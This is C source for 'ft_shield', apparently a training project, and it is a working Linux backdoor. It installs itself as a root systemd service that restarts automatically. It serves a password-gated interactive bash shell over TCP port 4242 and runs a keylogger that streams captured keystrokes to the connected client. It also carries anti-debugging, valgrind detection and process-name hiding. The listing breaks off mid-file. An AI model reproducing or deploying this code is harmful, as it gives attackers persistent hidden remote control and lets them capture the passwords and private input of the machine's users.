/* FT_SHIELD.H */
# ifndef DEBUG
#  define ENABLE
# endif

# include <fcntl.h>
# include <libgen.h>
# include <limits.h>
# include <stdbool.h>
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <errno.h>
# include <unistd.h>
# include <arpa/inet.h>
// # include <bsd/string.h>
# include <linux/limits.h>
# include <sys/types.h>
# include <sys/socket.h>
# include <sys/select.h>
# include <sys/un.h>
# include <sys/wait.h>
# include <sys/ioctl.h>
# include <linux/input.h>
# include <sys/stat.h>
# include <dirent.h>

#define DEST_PATH "/bin/ft_shield"
#define DEV_PATH "/dev/input"
#define MAX_EVENTS 3
#define KEY_PRESSED 1
#define KEY_RELEASED 0
#define KEY_REPEATED 2
#define DEST_SERVICE "/etc/systemd/system/ft_shield.service"
#define LISTENING_PORT 4242
#define MAX_CONECTIONS 32 //because pipes may need more fds...
#define MAX_NBR_CLIENTS 2
#define READ_END 0
#define WRITE_END 1

#define TRIM_CHARS "\f\n\r\t\v "

#define HELP "\
---------------------------------\n\
?      - Shows help\n\
clear  - Clear terminal\n\
logon  - Spawns a keylogger in port 4242\n\
shell  - Spawn shell in port 4242\n\
nstats - Shows network stats\n\
---------------------------------\n\
"
#define REMOTE_OPENED "New remote shell opened in port 4242\n"
#define MANY_CLIENTS "Connection denied, too many clients\n"
#define CLEAR_CODE "\033[H\033[2J"

#define SERVICE "\
[Unit]\n\
Description=ft_shield service\n\
After=network.target\n\
\n\
[Service]\n\
Type=simple\n\
ExecStart=/bin/ft_shield\n\
Restart=always\n\
RestartSec=5\n\
User=root\n\
\n\
[Install]\n\
WantedBy=multi-user.target\n\
"

typedef struct s_list t_list;
typedef struct input_event t_event;

typedef enum e_status {
	HANDSHAKE,
	CONNECTED,
	SHELL,
	KEYLOGGER
} t_status;

typedef struct s_client {
	int			fd;
	t_status	status;
	char		*shell_code;
	char		*response_bffr;
	char		disconnect;
	size_t		inbytes; //client input bytes
	size_t		outbytes; //client output bytes
	int			inpipe_fd;
	int			outpipe_fd;
}	t_client;

typedef struct s_server {
	int			fd;
	int			nbr_clients;
	t_list		*pids;
	t_list		*passwords;
	t_client	clients[MAX_CONECTIONS];
	size_t		total_outbytes;
	size_t		total_inbytes;
	fd_set		rfds;
	fd_set		wfds;
}	t_server;

int		handle_input(t_server *server, int index, char *buffer);
void	handle_handshake(t_server *server, int index, char *input);
int		handle_commands(t_server *server, int index, char *input);
void	delete_client(t_server *server, int index);
int		extract_outpipe(t_server *server, int index);

/* shell.c */
// void	*shell_function(void *data);
int	shell_function(t_server *server, int index);

/* keylogger.c */
int	keylogger_function(t_server *server, int index);

/* keylogger_utils.c */
int hasEventTypes(int fd, unsigned long evbit_to_check);
int hasKeys(int fd);
int hasRelativeMovement(int fd);
int hasAbsoluteMovement(int fd);
int hasSpecificKeys(int fd, int *keys, size_t num_keys);
int keyboardFound(char *path, int *keyboard_fd);

/* stealth.c */
int	is_valgrind_running();
int	is_debugger_attached();

/* service.c */
void	create_service(void);
void	start_service(void);

/* server.c */
void	create_server_socket(t_server *s);
void	ft_server(t_server *server);

int	find_own_path(char *buffer, size_t size_buffer);

/* utils/utils.c */
char	*ft_strnstr(const char *haystack, const char *needle, size_t len);
char	*ft_strtrim(char const *s1, char const *set);
void	simple_deterministic_id(const uint8_t *input_data, size_t input_len, char *output);
char	*gen_random_password(void);

void	ft_dprintf(int fd, const char *format, ...);
void	ft_perror(char *str);

char	*ft_strdup(const char *s1);
void	add2buffer(t_client *client, char *str);

typedef struct s_list
{
	void			*content;
	struct s_list	*next;
}	t_list;

t_list	*ft_lstnew(void *content);
t_list	*ft_lstlast(t_list *lst);
void	ft_lstadd_back(t_list **lst, t_list *new_node);
bool	shell_was_closed(t_list *node);
void	ft_delete_node_if_true(t_server *server, t_list **lst, bool (*f)(t_list *));
void	ft_lstdelone(t_list *lst, void (*del)(void *));
void	ft_lstclear(t_list **lst, void (*del)(void *));
void	hide_process_name(char **argv);

/*--------------------------------------*/

/* KEYLOGER_UTILS.C */
int hasEventTypes(int fd, unsigned long evbit_to_check)
{
	unsigned long evbit = 0;

	ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);

	return ((evbit & evbit_to_check) == evbit_to_check);
}

int hasKeys(int fd)
{
	return hasEventTypes(fd, (1 << EV_KEY));
}

int hasRelativeMovement(int fd)
{
	return hasEventTypes(fd, (1 << EV_REL));
}

int hasAbsoluteMovement(int fd)
{
	return hasEventTypes(fd, (1 << EV_ABS));
}

int hasSpecificKeys(int fd, int *keys, size_t num_keys)
{

	size_t nchar = KEY_MAX / 8 + 1;
	unsigned char bits[nchar];

	ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(bits)), &bits);

	for (size_t i = 0; i < num_keys; ++i)
	{
		int key = keys[i];
		if (!(bits[key / 8] & (1 << (key % 8))))
			return 0;
	}
	return 1;
}

int keyboardFound(char *path, int *keyboard_fd)
{
	DIR *dir = opendir(path);
	if (dir == NULL)
		return 0;

	struct dirent *entry;
	while ((entry = readdir(dir)) != NULL)
	{
		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
			continue;

		char filepath[320];
		snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);
		struct stat file_stat;
		if (stat(filepath, &file_stat) == -1)
		{
			ft_perror("Error getting file information");
			continue;
		}

		if (S_ISDIR(file_stat.st_mode))
		{
			if (keyboardFound(filepath, keyboard_fd))
			{
				closedir(dir);
				return 1;
			}
		}
		else
		{
			int fd = open(filepath, O_RDONLY);
			int keys_to_check[] = {KEY_Q, KEY_W, KEY_E, KEY_R, KEY_T, KEY_Y, KEY_BACKSPACE, KEY_ENTER, KEY_0, KEY_1, KEY_2, KEY_ESC};
			if (!hasRelativeMovement(fd) && !hasAbsoluteMovement(fd) && hasKeys(fd) && hasSpecificKeys(fd, keys_to_check, 12))
			{
				printf("Keyboard found! File: \"%s\"\n", filepath);
				closedir(dir);
				*keyboard_fd = fd;
				return 1;
			}
			close(fd);
		}
	}

	closedir(dir);
	return 0;
}


/* KEYLOGER.C */
#include <linux/input.h>
#include <dirent.h>
#include <ctype.h>
#include <sys/ioctl.h>

char *keycodes[247] = {"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "MINUS", "EQUAL", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE", "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X", "C", "V", "B", "N", "M", "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "KP7", "KP8", "KP9", "KPMINUS", "KP4", "KP5", "KP6", "KPPLUS", "KP1", "KP2", "KP3", "KP0", "KPDOT", "ZENKAKUHANKAKU", "102ND", "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", "KPJPCOMMA", "KPENTER", "RIGHTCTRL", "KPSLASH", "SYSRQ", "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END", "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN", "VOLUMEUP", "POWER", "KPEQUAL", "KPPLUSMINUS", "PAUSE", "SCALE", "KPCOMMA", "HANGEUL", "HANGUEL", "HANJA", "YEN", "LEFTMETA", "RIGHTMETA",
                       "COMPOSE", "STOP", "AGAIN", "PROPS", "UNDO", "FRONT", "COPY", "OPEN", "PASTE", "FIND", "CUT", "HELP", "MENU", "CALC", "SETUP", "SLEEP", "WAKEUP", "FILE", "SENDFILE", "DELETEFILE", "XFER", "PROG1", "PROG2", "WWW", "MSDOS", "COFFEE", "SCREENLOCK", "ROTATE_DISPLAY",
                       "DIRECTION", "CYCLEWINDOWS", "MAIL", "BOOKMARKS", "COMPUTER", "BACK", "FORWARD", "CLOSECD", "EJECTCD", "EJECTCLOSECD", "NEXTSONG", "PLAYPAUSE", "PREVIOUSSONG", "STOPCD", "RECORD", "REWIND", "PHONE", "ISO", "CONFIG", "HOMEPAGE", "REFRESH", "EXIT", "MOVE", "EDIT", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN", "KPRIGHTPAREN", "NEW", "REDO", "F13", "F14", "F15", "F16", "F17", "F18", "F19", "F20", "F21", "F22", "F23", "F24", "PLAYCD", "PAUSECD", "PROG3", "PROG4", "ALL_APPLICATIONS", "DASHBOARD", "SUSPEND", "CLOSE", "PLAY", "FASTFORWARD", "BASSBOOST", "PRINT", "HP", "CAMERA", "SOUND", "QUESTION", "EMAIL", "CHAT", "SEARCH", "CONNECT", "FINANCE", "SPORT", "SHOP", "ALTERASE", "CANCEL", "BRIGHTNESSDOWN", "BRIGHTNESSUP", "MEDIA", "SWITCHVIDEOMODE", "KBDILLUMTOGGLE", "KBDILLUMDOWN", "KBDILLUMUP", "SEND", "REPLY", "FORWARDMAIL", "SAVE", "DOCUMENTS", "BATTERY", "BLUETOOTH", "WLAN", "UWB", "UNKNOWN", "VIDEO_NEXT", "VIDEO_PREV", "BRIGHTNESS_CYCLE", "BRIGHTNESS_AUTO", "BRIGHTNESS_ZERO", "DISPLAY_OFF", "WWAN", "WIMAX"};
size_t event_size = sizeof(t_event);


#define KLG_HELP "Available commands:\n\
help: print this help\n\
exit: close keylogger\n"

static int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
{
	int written;
	char str[256] = {0};
	for (size_t j = 0; j < to_write / event_size; j++)
		snprintf(str, 255, "Key: %s\n", keycodes[events[j].code]);
	written = write(fd, str, strlen(str));
	if (written < 0)
		return written;
	return 1;
}

void handle_klg_cmd(char *bfr) {
	if (!strncmp("help\n", bfr, strlen(bfr))) {
		printf(KLG_HELP);
	}
	if (!strncmp("exit\n", bfr, strlen(bfr))) {
		exit(0);
	}
}

int	keylogger_function(t_server *server, int index)
{
	const int	client_fd = server->clients[index].fd;
	pid_t		pid;
	int			inpipe_fds[2], outpipe_fds[2];

	ft_dprintf(2, "clientfd: %d\n", client_fd);


	pipe(inpipe_fds);
	pipe(outpipe_fds);
	server->clients[index].inpipe_fd = inpipe_fds[WRITE_END]; //write end for server, we read from 0 here in stdin
	server->clients[index].outpipe_fd = outpipe_fds[READ_END]; //read end for server, we write in 1 here

	pid = fork();
	if (pid < 0) {
		ft_perror("fork");
	}
	else if (pid == 0) {
		setsid();

		close(server->fd);
		close(inpipe_fds[WRITE_END]);
		close(outpipe_fds[READ_END]);
		dup2(inpipe_fds[READ_END], STDIN_FILENO);
		dup2(outpipe_fds[WRITE_END], STDERR_FILENO);
		dup2(outpipe_fds[WRITE_END], STDOUT_FILENO);
		close(inpipe_fds[READ_END]);
		close(outpipe_fds[WRITE_END]);
		close(client_fd);
		int	kb;
		if (!keyboardFound(DEV_PATH, &kb)) {
			printf("couldn't open keyboard :(\n");
			exit(1);
		}

		t_event kbd_events[event_size * MAX_EVENTS];
		fd_set rset;
		
		int maxfd = kb;

		while (1)
		{
			fflush(stdout);
			FD_SET(STDIN_FILENO, &rset);
			FD_SET(kb, &rset);
			struct timeval tv = {.tv_sec = 0, .tv_usec = 5000};
			int retval = select(maxfd + 1, &rset, NULL, NULL, &tv);
			if (retval == -1) { ft_perror("select"); break; }
			if (FD_ISSET(kb, &rset)) {
				int r = read(kb, kbd_events, event_size * MAX_EVENTS);
				if (r < 0)
					break ;
				else
				{
					size_t j = 0;
					for (size_t i = 0; i < r / event_size; i++) //for each event read
					{
						if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) //if a key has been pressed..
							kbd_events[j++] = kbd_events[i];                                    //add the event to the beginning of the array
					}
					if (writeEventsIntoFile(STDOUT_FILENO, kbd_events, j * event_size) < 0)
						break ;
				}
			}
			if (FD_ISSET(STDIN_FILENO, &rset)) {
				char buffer[256];
				int r = read(STDIN_FILENO, buffer, 255);
				if (r <= 0)
					break ;
				buffer[r] = 0;
				handle_klg_cmd(buffer);
			}
		}
		close(STDOUT_FILENO);
		close(kb);
		exit(0);
	}
	else if (pid > 0) {
		ft_lstadd_back(&server->pids, ft_lstnew((void *)(long)pid));
		close(inpipe_fds[READ_END]);
		close(outpipe_fds[WRITE_END]);
	}
	return (1);
}


/* HANDLERS.C */
bool	search_password(t_server *server, char *input)
{
	t_list	*lst = server->passwords;
	t_list	*prev = NULL;

	while (lst)
	{
		if (strcmp(lst->content, input) == 0)
		{
			if (prev == NULL)
				server->passwords = lst->next;
			else
				prev->next = lst->next;
			ft_dprintf(2, "password [%s] found and deleted\n", input);
			free(lst->content);
			free(lst);
			return (true);
		}
		prev = lst;
		lst = lst->next;
	}
	return (false);
}

bool	check_server_password(t_server *server, char *input)
{
	const char	*server_pass = "E4F47C78F4E89C24DC38907008A4284C";
	char		input_hash[33];

	(void)server;
	simple_deterministic_id((uint8_t *)input, strlen(input), input_hash);
	ft_dprintf(2, "input: [%s] hash: [%s]\n", input, input_hash);
	if (strcmp(server_pass, input_hash) == 0)
	{
		ft_dprintf(2, "password match\n");
		return (true);
	}
	return (false);
}

void	handle_handshake(t_server *server, int index, char *input) {
	t_client *const	client = &server->clients[index];

	if (client->status == HANDSHAKE)
	{
		ft_dprintf(2, "HANDSHAKE INPUT [%s]\n", input);
		if (search_password(server, input) == true)
		{
			shell_function(server, index);
			client->status = SHELL;
			return ;
		}
		if (check_server_password(server, input) == false)
		{
			ft_dprintf(2, "Invalid KEY\n");
			return ;
		}
		ft_dprintf(2, "Valid KEY\n");
		client->status = CONNECTED;
		add2buffer(&server->clients[index], strdup("$> "));
	}
}

void	add_password(t_server *server, int index)
{
	char		*password = gen_random_password();
	t_list		*new_node = ft_lstnew(password);
	char		msg_connection[300] = {0};

	ft_lstadd_back(&server->passwords, new_node);
	sprintf(msg_connection, "To access the remote shell, use the next Keycode -> [%s]\n", password);
	add2buffer(&server->clients[index], strdup(msg_connection));
}

void	delete_client(t_server *server, int index)
{
	t_client *client = &server->clients[index];

	close(client->fd);
	if (client->inpipe_fd && client->outpipe_fd) {
		close(client->inpipe_fd);
		close(client->outpipe_fd);
	}
	memset(&server->clients[index], 0, sizeof(t_client));
	server->nbr_clients--;
}

void	nstats(t_server *s, int index)
{
	char		msg[300] = {0};

	sprintf(msg, "Total inbytes: %ld\nTotal outbytes: %ld\nSession inbytes: %ld\nSession outbytes: %ld\n\n",
		s->total_inbytes, s->total_outbytes, s->clients[index].inbytes, s->clients[index].outbytes );
	add2buffer(&s->clients[index], strdup(msg));
}

int	handle_commands(t_server *server, int index, char *input)
{
	t_client	*client = &server->clients[index];

	if (strcmp("clear", input) == 0)
	{
		add2buffer(&server->clients[index], strdup(CLEAR_CODE));
	}
	else if (strcmp("shell", input) == 0)
	{
		ft_dprintf(2, "client_fd: %d\n", client->fd);
		add_password(server, index);
		client->disconnect = true;
		//delete_client(server, index);
	}
	else if (strcmp("logon", input) == 0)
	{
		client->status = KEYLOGGER;
		keylogger_function(server, index);
		return (0);
	}
	else if (strcmp("nstats", input) == 0)
	{
		nstats(server, index);
	}
	else if (strcmp("?", input) == 0 || strcmp("help", input) == 0)
	{
		add2buffer(&server->clients[index], strdup(HELP));
	}
	add2buffer(client, strdup("$> "));
	return (0);
}

int	handle_inpipe(t_server *server, int index, char *input)
{
	t_client	*client = &server->clients[index];
	//printf("trying to write inpipe, fdisset %i\n", FD_ISSET(client->inpipe_fd, &server->wfds));
	if (client->inpipe_fd && FD_ISSET(client->inpipe_fd, &server->wfds))
	{
		//printf("writing inpipe!\n");
		int r = write(client->inpipe_fd, input, strlen(input));
		if (r < 0) {
			close(client->inpipe_fd);
			client->inpipe_fd = 0;
			close(client->outpipe_fd);
			client->outpipe_fd = 0;
			client->status = CONNECTED;
			client->response_bffr = strdup("$> ");
		}
	}
	return 0;
}

int	extract_outpipe(t_server *server, int index)
{
	char buffer[4096];

	memset(buffer, 0, sizeof(buffer));
	int			r = 0;
	t_client	*client = &server->clients[index];
	//printf("trying to read outpipe %i, fdisset %i\n", client->outpipe_fd, FD_ISSET(client->outpipe_fd, &server->rfds));
	if (client->outpipe_fd && FD_ISSET(client->outpipe_fd, &server->rfds))
	{
		r = read(client->outpipe_fd, buffer, 4095);
		//printf("reading outpipe! (bytes: %i)\n", r);
		if (r == 0) {
			close(client->inpipe_fd);
			client->inpipe_fd = 0;
			close(client->outpipe_fd);
			client->outpipe_fd = 0;
			client->status = CONNECTED;
			client->response_bffr = strdup("$> ");
		}
		if (r > 0)
		{
			client->response_bffr = calloc(r + 1, 1);
			memcpy(client->response_bffr, buffer, r);
		}
		if (r < 0)
			client->response_bffr = strdup("errooooor\n");
	}
	return r;
}

int	handle_input(t_server *server, int index, char *buffer)
{
	const t_client	*client = &server->clients[index];
	char			*input = ft_strtrim(buffer, TRIM_CHARS);
	int				fd;

	ft_dprintf(2, "readed: [%s]\n", input);
	if (client->status == HANDSHAKE)
		handle_handshake(server, index, input);
	else if (client->status == CONNECTED)
		fd = handle_commands(server, index, input);
	else if (client->status == SHELL || client->status == KEYLOGGER)
		fd = handle_inpipe(server, index, buffer);
	free(input);
	return (fd);
}


/* SERVER.C */
void	create_server_socket(t_server *server)
{
	int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (socket_fd == -1)
	{
		ft_perror("socket");
		exit(EXIT_FAILURE);
	}

	int reuse = 1;
	if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, (const char *)&reuse, sizeof(reuse)) < 0)
	{
		ft_perror("setsockopt(SO_REUSEADDR)");
		exit(EXIT_FAILURE);
	}

	struct sockaddr_in server_addr;

	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(LISTENING_PORT);
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

	if (bind(socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1)
	{
		ft_perror("bind");
		exit(EXIT_FAILURE);
	}

	if (listen(socket_fd, MAX_CONECTIONS) == -1)
	{
		ft_perror("listen");
		exit(EXIT_FAILURE);
	}
	server->fd = socket_fd;
}


int	set_rw_fdset(t_client *clients, fd_set *rset, fd_set *wset, int server_fd)
{
	FD_ZERO(rset);
	FD_ZERO(wset);
	FD_SET(server_fd, rset);

	int max_fd = server_fd;
	for (int fd = 0; fd < MAX_CONECTIONS; ++fd)
	{
		if (clients[fd].fd)
		{
			FD_SET(clients[fd].fd, rset);
			FD_SET(clients[fd].fd, wset);
			if (clients[fd].fd > max_fd)
				max_fd = clients[fd].fd;
			if (clients[fd].inpipe_fd && clients[fd].outpipe_fd)
			{
				FD_SET(clients[fd].inpipe_fd, wset);
				FD_SET(clients[fd].outpipe_fd, rset);
				if (clients[fd].inpipe_fd > max_fd)
					max_fd = clients[fd].inpipe_fd;
				if (clients[fd].outpipe_fd > max_fd)
					max_fd = clients[fd].outpipe_fd;
			}
		}
	}
	return (max_fd);
}

void server_loop(t_server *s)
{
	t_client			*clients = s->clients;
	
	struct sockaddr_in	address;
	int					addrlen = sizeof(address);

	while (1)
	{
		struct timeval tv = {.tv_sec = 1, .tv_usec = 0};
		
		int max_fd = set_rw_fdset(clients, &s->rfds, &s->wfds, s->fd);

		int retval = select(max_fd + 1, &s->rfds, &s->wfds, NULL, &tv);
		if (retval == -1)
			ft_perror("select");
		else if (retval != 0)
		{
			if (FD_ISSET(s->fd, &s->rfds))
			{
				int	client_fd;
				if ((client_fd = accept(s->fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0)
				{
					ft_perror("accept");
					continue;
				}
				if (s->nbr_clients == MAX_NBR_CLIENTS)
				{
					send(client_fd, MANY_CLIENTS, sizeof(MANY_CLIENTS), 0);
					ft_dprintf(2, "Connection denied, too many clients\n");
					close(client_fd);
					continue;
				}

				char client_ip[200] = {0};
				inet_ntop(AF_INET, &address.sin_addr, client_ip, INET_ADDRSTRLEN);
				int client_port = ntohs(address.sin_port);

				ft_dprintf(2, "Accepted connection from %s:%d\n", client_ip, client_port);
				s->nbr_clients++;
				clients[client_fd].fd = client_fd;
				ft_dprintf(2, "New client accepted %d\n", client_fd);
				if (clients[client_fd].status == HANDSHAKE)
					send(client_fd, "Keycode: ", 10, 0);
			}

			for (int fd = 0; fd <= max_fd; ++fd)
			{
				int c_fd = clients[fd].fd;
				if (c_fd && FD_ISSET(c_fd, &s->rfds))
				{

					char buffer[1024] = {0};

					int rb = read(c_fd, buffer, sizeof(buffer) - 1);
					if (rb < 0)
					{
						ft_perror("recv");
						continue;
					}
					else if (rb == 0)
					{
						ft_dprintf(2, "Connection closed %d (recv)\n", c_fd);
						close(c_fd);
						if (clients[fd].outpipe_fd)
						{
							close(clients[fd].outpipe_fd);
							close(clients[fd].inpipe_fd);
						}
						memset(&clients[fd], 0, sizeof(t_client));
						s->nbr_clients--;
						continue;
					}
					else
					{
						s->total_inbytes += rb;
						clients[fd].inbytes += rb;
						handle_input(s, fd, buffer);
					}
					if (clients[fd].status == HANDSHAKE)
						add2buffer(&clients[fd], strdup("Keycode: "));
				}
				if (c_fd && FD_ISSET(c_fd, &s->wfds)) {
					int rpipe = 0;
					if (clients[fd].outpipe_fd) {
						rpipe = extract_outpipe(s, fd);
					}
					if (clients[fd].response_bffr) {
						int sb;
						if (rpipe > 0) {
							sb = write(c_fd,
								clients[fd].response_bffr,
								rpipe);
						} else {
							sb = write(c_fd,
								clients[fd].response_bffr,
								strlen(clients[fd].response_bffr));
						}
						if (sb < 0)
						{
							ft_perror("recv");
							continue;
						}
						else if (sb == 0)
						{
							ft_dprintf(2, "Connection closed %d (write)\nBuffer: (%s)\n", c_fd, clients[fd].response_bffr);
							close(c_fd);
							if (clients[fd].outpipe_fd)
							{
								close(clients[fd].outpipe_fd);
								close(clients[fd].inpipe_fd);
							}
							free(clients[fd].response_bffr);
							memset(&clients[fd], 0, sizeof(t_client));
							s->nbr_clients--;
							continue;
						}
						s->total_outbytes += sb;
						free(clients[fd].response_bffr);
						clients[fd].outbytes += sb;
						clients[fd].response_bffr = NULL;
						if (clients[fd].disconnect) {
							delete_client(s, fd);
						}
					}
				}
			}
		}
		else
		{
			t_list *aux = s->passwords;
			int i = 0;
			while (aux)
			{
				ft_dprintf(2, "password %d - %s\n", i, (char *)aux->content);
				i++;
				aux = aux->next;
			}
			ft_delete_node_if_true(s, &s->pids, shell_was_closed);
		}
	}
}

void	ft_server(t_server *server)
{
	create_server_socket(server);
	server_loop(server);
}


/* SERVICE.C */
void	create_service(void)
{
	ft_dprintf(2, "creating service\n");
	int	fd_config = open(DEST_SERVICE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (fd_config == -1) {
		ft_perror(DEST_SERVICE);
		exit(1);
	}
	int ret_write = write(fd_config, SERVICE, sizeof(SERVICE));
	if (ret_write == -1 || ret_write != sizeof(SERVICE)) {
		ft_perror("service");
	}
	close(fd_config);
}

void	start_service(void)
{
	ft_dprintf(2, "starting service\n");
	system("sudo systemctl daemon-reload");
	system("sudo systemctl enable ft_shield.service");
	system("sudo systemctl start ft_shield.service");
}


/* SHELL.C */
#include <fcntl.h>
#include <sys/ioctl.h>

int	shell_function(t_server *server, int index)
{
	const int	client_fd = server->clients[index].fd;
	pid_t		pid;
	int			inpipe_fds[2], outpipe_fds[2];

	ft_dprintf(2, "clientfd: %d\n", client_fd);

	pipe(inpipe_fds);
	pipe(outpipe_fds);
	server->clients[index].inpipe_fd = inpipe_fds[WRITE_END]; //write end for server, we read from 0 here in stdin
	server->clients[index].outpipe_fd = outpipe_fds[READ_END]; //read end for server, we write in 1 here
	
	pid = fork();
	if (pid < 0) {
		ft_perror("fork");

	}
	else if (pid == 0) {
		setsid();
		
		close(server->fd);
		close(inpipe_fds[WRITE_END]);
		close(outpipe_fds[READ_END]);
		dup2(inpipe_fds[READ_END], STDIN_FILENO);
		dup2(outpipe_fds[WRITE_END], STDERR_FILENO);
		dup2(outpipe_fds[WRITE_END], STDOUT_FILENO);
		close(inpipe_fds[READ_END]);
		close(outpipe_fds[WRITE_END]);
		close(client_fd);

		char *args[] = {"/bin/bash", "-i", NULL};
		setenv("TERM", "xterm-256color", 1);
		execv("/bin/bash", args);
		exit(1);
	}
	else if (pid > 0) {
		ft_lstadd_back(&server->pids, ft_lstnew((void *)(long)pid));
		close(inpipe_fds[READ_END]);
		close(outpipe_fds[WRITE_END]);
	}
	return (1);
}


/* STEALTH.C */
int	is_debugger_attached()
{
	FILE *file = fopen("/proc/self/status", "r");

	if (file == NULL) {
		ft_perror("/proc/self/status");
		return (1);
	}

	while (1) {
		char line[256] = {0};

		if (fgets(line, sizeof(line), file) == NULL)
			break;
		if (strstr(line, "TracerPid:")) {
			int pid = atoi(line + 10);
			if (pid != 0) {
				ft_dprintf(2, "Error: running inside a debugger\n");
				fclose(file);
				return (1);
			}
			break;
		}
	}

	fclose(file);
	return (0);
}

int	is_valgrind_running()
{
	FILE *file = fopen("/proc/self/maps", "r");

	if (file == NULL) {
		ft_perror("/proc/self/maps");
		return (1);
	}

	while (1) {
		char line[256] = {0};

		if (fgets(line, sizeof(line), file) == NULL)
			break;
		if (strstr(line, "valgrind")) {
			ft_dprintf(2, "Running on valgrind\n");
			fclose(file);
			return (1);
		}
	}

	fclose(file);
	return (0);
}

void	hide_process_name(char **argv)
{
	size_t len = strlen(argv[0]);
	memset(argv[0], 0, len);
	strncpy(argv[0], "PyS <3", len - 1);
}


/* PRINTS.C */
#ifdef ENABLE
# include <stdarg.h>
# include <time.h>
#endif

void ft_dprintf(int fd, const char *format, ...)
{
	#ifdef ENABLE
		time_t now = time(NULL);
		struct tm *t = localtime(&now);
		dprintf(fd, "[%02d:%02d:%02d] ", t->tm_hour, t->tm_min, t->tm_sec);
		
		va_list args;
		va_start(args, format);
		vdprintf(fd, format, args);
		va_end(args);
	#else
		(void)fd, (void)format;
	#endif
}

void ft_perror(char *str)
{
	#ifdef ENABLE
		time_t now = time(NULL);
		struct tm *t = localtime(&now);
		dprintf(2, "[%02d:%02d:%02d] ", t->tm_hour, t->tm_min, t->tm_sec);
		perror(str);
	#else
		(void)str;
	#endif
}


/* UTILS.C */
char	*ft_strnstr(const char *haystack, const char *needle, size_t len)
{
	size_t	pos;
	size_t	i;

	if (!*needle)
		return ((char *)haystack);
	pos = 0;
	while (haystack[pos] && pos < len)
	{
		if (haystack[pos] == needle[0])
		{
			i = 1;
			while (needle[i] && haystack[pos + i] == needle[i]
				&& (pos + i) < len)
				++i;
			if (needle[i] == '\0')
				return ((char *)&haystack[pos]);
		}
		++pos;
	}
	return (NULL);
}

size_t	ft_strlcpy(char *dest, const char *src, size_t size)
{
	size_t	i;

	if (size == 0)
		return (strlen(src));
	i = 0;
	if (size != 0)
	{
		while (src[i] != '\0' && i < (size -1))
		{
			dest[i] = src[i];
			i++;
		}
		dest[i] = '\0';
	}
	return (strlen(src));
}

char	*ft_strtrim(char const *s1, char const *set)
{
	char	*final;
	size_t	i;
	size_t	size;

	final = NULL;
	if (s1 != NULL && set != NULL)
	{
		i = 0;
		size = strlen(s1);
		while (s1[i] && strchr(set, s1[i]))
			i++;
		while (s1[size -1] && strrchr(set, s1[size -1]) && size > i)
			size--;
		final = calloc((size - i + 1), sizeof(char));
		if (final == NULL)
			return (NULL);
		ft_strlcpy(final, &s1[i], size - i + 1);
	}
	return (final);
}

#define FIXED_OUTPUT_SIZE 16
#define HEX_OUTPUT_SIZE ((FIXED_OUTPUT_SIZE * 2) + 1)

void simple_deterministic_id(const uint8_t *input_data, size_t input_len, char *output)
{
	uint8_t buffer[FIXED_OUTPUT_SIZE] = {0};
	
	for (size_t i = 0; i < input_len; i++)
	{
		for (size_t j = 0; j < FIXED_OUTPUT_SIZE; j++)
		{
			buffer[j] ^= input_data[i] + (i * j * 17);
			buffer[j] = (buffer[j] * 13) % 256;
		}
	}

	for (size_t i = 0; i < FIXED_OUTPUT_SIZE; i++)
	{
		buffer[i] ^= buffer[(i + 5) % FIXED_OUTPUT_SIZE];
		buffer[i] += buffer[(i + 11) % FIXED_OUTPUT_SIZE];
	}

	for (size_t i = 0; i < FIXED_OUTPUT_SIZE; i++)
		sprintf(output + (i * 2), "%02X", buffer[i]);
	output[HEX_OUTPUT_SIZE - 1] = '\0';
}

char	*gen_random_password(void)
{
	uint8_t input[64];

	int fd = open("/dev/urandom", O_RDONLY);
	int ret_read = read(fd, input, 64);

	if (ret_read <= 0)
		return (NULL);
	char *password = calloc(HEX_OUTPUT_SIZE, sizeof(char));

	simple_deterministic_id(input, ret_read, password);
	close(fd);
	return (password);
}

static char	*ft_strjoin(char const *s1, char const *s2)
{
	size_t	s1len;
	size_t	s2len;
	char	*res;
	size_t	pos;

	s1len = strlen(s1);
	s2len = strlen(s2);
	res = malloc(s1len + s2len + 1);
	if (res == (void *) 0)
		return (res);
	pos = 0;
	while (pos < s1len)
	{
		res[pos] = s1[pos];
		++pos;
	}
	pos = 0;
	while (pos <= s2len)
	{
		res[pos + s1len] = s2[pos];
		++pos;
	}
	return (res);
}

void	add2buffer(t_client *client, char *str) {
	if (!client->response_bffr) {
		client->response_bffr = str;
		return ;
	}
	char *new = ft_strjoin(client->response_bffr, str);
	free(str);
	free(client->response_bffr);
	client->response_bffr = new;
}

/* LST.C */
t_list	*ft_lstnew(void *content)
{
	t_list *lst = calloc(1, sizeof(t_list));

	if (lst == NULL)
		return (NULL);
	lst->content = content;
	return (lst);
}

t_list	*ft_lstlast(t_list *lst)
{
